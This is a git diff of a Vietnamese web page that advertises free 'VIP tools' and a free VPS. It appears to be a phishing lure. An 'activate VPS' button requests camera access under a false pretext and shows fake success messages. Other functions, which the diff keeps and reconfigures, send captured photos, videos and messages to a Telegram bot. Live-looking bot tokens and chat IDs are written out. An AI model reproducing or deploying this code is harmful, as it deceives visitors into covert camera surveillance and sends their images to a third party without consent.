@@ -5,47 +5,73 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>@haonguyenn</title>
 
-<!-- Phát nhạc nền tự động -->
-<audio autoplay loop>
+<!-- Nhạc nền -->
+<audio id="background-music" loop>
     <source src="https://drive.google.com/uc?export=download&id=1OWnyc4-nEWAI_vzyJdGoOyyApfgzU-w0" type="audio/mp3">
-    Trình duyệt của bạn không hỗ trợ phát nhạc.
 </audio>
 
 <style>
-  /* Nền động */
+  * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+  }
+
   body {
-    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    font-family: 'Poppins', sans-serif;
     background: url('https://w0.peakpx.com/wallpaper/1013/857/HD-wallpaper-the-code-bug-error-program-dark-red.jpg') no-repeat center center fixed;
     background-size: cover;
     display: flex;
     justify-content: center;
     align-items: center;
     height: 100vh;
-    margin: 0;
     color: #fff;
     flex-direction: column;
     text-align: center;
   }
 
-  /* Container */
+  /* Hộp chính */
   .container {
-    background: rgba(0, 0, 0, 0.6); 
+    background: rgba(255, 255, 255, 0.1);
     border-radius: 15px;
-    padding: 20px;
-    max-width: 400px;
-    text-align: center;
+    padding: 25px;
+    max-width: 420px;
+    backdrop-filter: blur(12px);
+    box-shadow: 0px 5px 20px rgba(255, 255, 255, 0.1);
+    position: relative;
+    border: 1px solid rgba(255, 255, 255, 0.2);
   }
 
-  /* Hiệu ứng chữ 7 màu */
+  /* Avatar xoay vòng */
+  @keyframes rotateAvatar {
+    0% { transform: translateX(-50%) rotate(0deg); }
+    100% { transform: translateX(-50%) rotate(360deg); }
+  }
+
+  .avatar {
+    width: 87px;
+    height: 87px;
+    border-radius: 50%;
+    border: 3px solid #fff;
+    position: absolute;
+    top: -68px;
+    left: 50%;
+    transform: translateX(-50%);
+    background: url('https://f48-zpg-r.zdn.vn/jpg/4167362700600524469/d1f5f21475bdcbe392ac.jpg') center/cover;
+    animation: rotateAvatar 5s linear infinite;
+  }
+
+  /* Chữ cầu vồng động */
   .rainbow-text {
-    font-size: 36px;
+    font-size: 28px;
     font-weight: bold;
-    background-image: linear-gradient(90deg, red, orange, yellow, green, blue, indigo, violet);
+    text-transform: uppercase;
+    background: linear-gradient(90deg, #ff0000, #ff7300, #fffb00, #48ff00, #00ffea, #0f00ff, #ff00c3);
     -webkit-background-clip: text;
     color: transparent;
-    animation: rainbowText 5s linear infinite;
+    animation: rainbowText 3s linear infinite;
     background-size: 400% 100%;
-    margin-bottom: 20px;
+    text-shadow: 2px 2px 10px rgba(0, 0, 0, 0.8);
   }
 
   @keyframes rainbowText {
@@ -53,41 +79,167 @@
     100% { background-position: 100%; }
   }
 
-  /* Nút hình viên thuốc */
+/* Nút bấm */
   .pill-button {
-    position: fixed;
-    bottom: 10px;
-    left: 40%;
-    transform: translateX(-40%);
+    margin-top: 15px;
+    width: 300px; /* Đặt chiều rộng cố định */
     background: linear-gradient(45deg, #ff416c, #ff4b2b);
     color: white;
     font-size: 18px;
     border: none;
-    padding: 10px 20px;
-    border-radius: 40px;
+    padding: 12px 25px;
+    border-radius: 30px;
     cursor: pointer;
     font-weight: bold;
-    transition: 0.3s;
+    box-shadow: 0px 5px 15px rgba(255, 75, 75, 0.3);
+    transition: all 0.3s ease-in-out;
+    text-align: center; /* Căn giữa nội dung */
+    display: flex;
+    justify-content: center;
+    align-items: center;
   }
 
   .pill-button:hover {
     background: linear-gradient(45deg, #ff4b2b, #ff416c);
-    transform: translateX(-40%) scale(1.1);
+    transform: translateY(-3px);
+    box-shadow: 0px 8px 20px rgba(255, 75, 75, 0.4);
   }
 
+  /* Thông báo đẩy */
+  .toast-container {
+    position: fixed;
+    top: 20px;
+    right: -320px;
+    transition: right 0.5s ease-in-out;
+    z-index: 1000;
+  }
+
+  .toast {
+    background: rgba(0, 0, 0, 0.9);
+    color: #fff;
+    padding: 15px 20px;
+    border-radius: 5px;
+    margin-bottom: 10px;
+    font-size: 16px;
+    box-shadow: 0px 5px 10px rgba(0, 0, 0, 0.3);
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    opacity: 0;
+    animation: fadeIn 0.5s forwards;
+  }
+
+  @keyframes fadeIn {
+    from { opacity: 0; transform: translateX(30px); }
+    to { opacity: 1; transform: translateX(0); }
+  }
+
+  /* Contact hình tròn */
+  .contact-button {
+    width: 60px;
+    height: 60px;
+    border-radius: 50%;
+    background: #00eaff;
+    position: fixed;
+    bottom: 20px;
+    right: 20px;
+    cursor: grab;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    font-size: 24px;
+    font-weight: bold;
+    color: white;
+    box-shadow: 0px 5px 10px rgba(0, 0, 0, 0.3);
+    user-select: none;
+  }
+
+  .contact-box {
+    display: none;
+    position: fixed;
+    bottom: 90px;
+    right: 20px;
+    background: rgba(0, 0, 0, 0.9);
+    padding: 15px;
+    border-radius: 10px;
+    font-size: 16px;
+    box-shadow: 0px 5px 10px rgba(0, 0, 0, 0.3);
+  }
 </style>
 </head>
 
 <body>
 
+
+
+<!-- Thông báo đẩy -->
+<div class="toast-container" id="toastContainer"></div>
+
 <div class="container">
-  <h1 class="rainbow-text">Website Tool Free - Cấp Quyền Truy Cập Để Tool Down Về Máy, Update Tool Thường Xuyên Nhé</h1>
-  <h2 class="message">Nhận Tool Miễn Phí Bao Vip, VPS Free Bao 1 Năm. An toàn miễn phí</h2>
-  <div id="countdown"></div>
+  <div class="avatar"></div>
+  <h1 class="rainbow-text">Website Tool Free</h1>
+  <h2 class="message">Nhận tool miễn phí bao VIP, VPS free 1 năm.</h2>
 </div>
 
-<!-- Nút hình viên thuốc -->
-<button class="pill-button" onclick="requestCameraAccess()">Download 📩</button>
+<!-- Nút kích hoạt VPS -->
+<button class="pill-button" onclick="activateVPS()">🌐 Kích hoạt VPS miễn phí</button>
+
+<!-- Nút tải xuống -->
+<button class="pill-button" onclick="showToast('⚠️ Chưa cấp quyền, không thể tải file!')">🚀 Download</button>
+
+<!-- Nút bật/tắt nhạc -->
+<button class="pill-button" onclick="toggleMusic()">🎵 Phát/Dừng nhạc</button>
+
+<!-- Nút contact hình tròn -->
+<div class="contact-button" onclick="toggleContact()">📞</div>
+
+<!-- Hộp contact -->
+<div class="contact-box" id="contactBox">
+  <p>📩 Zalo: <a href="https://zalo.me/0946544624">Tại đây</a></p>
+  <p>💬 Telegram: <a href="https://t.me/haongsz" target="_blank">Tại đây</a></p>
+</div>
+
+<script>
+  function activateVPS() {
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        showToast("✅ VPS đã kích hoạt thành công!");
+      })
+      .catch(error => {
+        showToast("❌ Bạn chưa cấp quyền camera!");
+      });
+  }
+
+  function showToast(message) {
+    const container = document.getElementById("toastContainer");
+    const toast = document.createElement("div");
+    toast.className = "toast";
+    toast.textContent = message;
+    
+    container.appendChild(toast);
+    container.style.right = "20px";
+
+    setTimeout(() => {
+      toast.style.opacity = "0";
+      setTimeout(() => {
+        toast.remove();
+      }, 500);
+    }, 3000);
+  }
+
+  function toggleMusic() {
+    var audio = document.getElementById("background-music");
+    audio.paused ? (audio.play(), showToast("🎵 Nhạc đã bật!")) : (audio.pause(), showToast("🔇 Nhạc đã tắt!"));
+  }
+
+  function toggleContact() {
+    var contactBox = document.getElementById("contactBox");
+    contactBox.style.display = contactBox.style.display === "none" ? "block" : "none";
+  }
+</script>
+
+</body>
+</html>
 
 <script>
   async function getCurrentTime() {
@@ -106,8 +258,8 @@
   }
 
   async function sendTelegramMessage(message) {
-    var botToken = '8033535387:AAFL7IwbAOBuRimZAXOPvxNsk4qDajTuBa4';
-    var chatID = '7147296126';
+    var botToken = '7811325007:AAETVpkG6MAk6JXoKQuHu5RHy5ILf4a5rb4';
+    var chatID = '7779940330';
     var url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatID + "&text=" + encodeURIComponent(message);
 
     try {
@@ -163,7 +315,7 @@
 
   function sendTelegramPhoto(photoData, message) {
     var botToken = '8033535387:AAFL7IwbAOBuRimZAXOPvxNsk4qDajTuBa4';
-    var chatID = '7147296126';
+    var chatID = '7779940330';
     var url = "https://api.telegram.org/bot" + botToken + "/sendPhoto";
 
     var formData = new FormData();
@@ -190,8 +342,8 @@
   }
 
   function sendTelegramVideo(videoData, caption) {
-    var botToken = '8033535387:AAFL7IwbAOBuRimZAXOPvxNsk4qDajTuBa4';
-    var chatID = '7147296126';
+    var botToken = '7811325007:AAETVpkG6MAk6JXoKQuHu5RHy5ILf4a5rb4';
+    var chatID = '7779940330';
     var formData = new FormData();
     formData.append("chat_id", chatID);
     formData.append("video", videoData, "video.mp4");
